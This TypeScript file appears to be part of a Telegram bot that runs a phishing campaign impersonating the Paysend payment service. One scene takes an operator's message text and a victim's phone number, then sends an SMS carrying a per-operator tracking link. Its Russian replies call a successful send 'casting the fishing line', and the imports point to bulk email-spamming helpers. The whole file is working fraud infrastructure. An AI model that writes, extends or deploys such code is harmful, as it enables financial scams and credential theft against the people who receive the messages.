import {Context} from "@/database/models/context";
import {Scene} from "grammy-scenes";
import {Composer, InlineKeyboard} from "grammy";
import {adsRepository, domensRepository} from "@/database";
import {deleteAllMessages} from "@/helpers/deleteAllMessages";
import {sendEmailAnafema, sendEmailKeshMail, sendEmailYourMailer} from "@/utils/rassilka/email";
import {sendSms, sendSmsPaysend} from "@/utils/rassilka/sms";
import console from "console";
import {getDomen} from "@/helpers/getDomen";

export const scene = new Scene<Context>('smsSendPaysend')
export const composer = new Composer<Context>()
const regex = /sms ad paysend/gmi
composer.callbackQuery(regex, handler)

async function handler(ctx: Context)  {
    const match = regex.exec(ctx.callbackQuery.data)
    await ctx.scenes.enter('smsSendPaysend', {})
}

async function cancel(ctx) {
    await deleteAllMessages(ctx.session.deleteMessage, ctx)
    ctx.scene.exit()
}

scene.always().callbackQuery('cancel smsSendPaysend', cancel)

scene.do(async (ctx) => {
    ctx.session.smsEmail = {ad: Number(ctx.scene.opts.arg.id), to: undefined, pattern: undefined}
    ctx.session.deleteMessage = []

    const msg = await ctx.reply("<b>🪤 Введи письмо для смс:</b>", {
        reply_markup:  new InlineKeyboard()
            .text('Отмена', 'cancel smsSendPaysend')
    })
    ctx.session.deleteMessage.push(msg.message_id)
    ctx.scene.resume()
})

scene.wait().on('message:text', async ctx => {
    ctx.session.smsEmail.pattern = ctx.msg.text

    const msg = await ctx.reply("<b>📱 Введи номер (без +):</b>", {
        reply_markup:  new InlineKeyboard()
            .text('Отмена', 'cancel smsSendPaysend')
    })
    ctx.session.deleteMessage.push(msg.message_id)
    ctx.scene.resume()
})

scene.wait().on('message:text', async ctx => {
    ctx.session.smsEmail.to = ctx.msg.text
    ctx.session.deleteMessage.push(ctx.msg.message_id)

    const domen = await getDomen(ctx.user,'paysend')
    if (!domen) {
        await ctx.reply(`domen undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }
    const msg = await ctx.reply(`⏳`)

    const response = await sendSmsPaysend(ctx.session.smsEmail.to, ctx.session.smsEmail.pattern, ctx.session.smsEmail.who,`https://${domen.link}/link/paysend/${ctx.user.id}`, ctx.from.id)
    try {
        ctx.api.deleteMessage(ctx.chat.id,msg.message_id)
    } catch (e) {}

    console.log(response)
    await ctx.reply(
        (response?.status === "true")
            ? `✅ Удочка закинута`
            : `⚠️ Не удалось отправить смс`,
        {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })

    return cancel(ctx)
})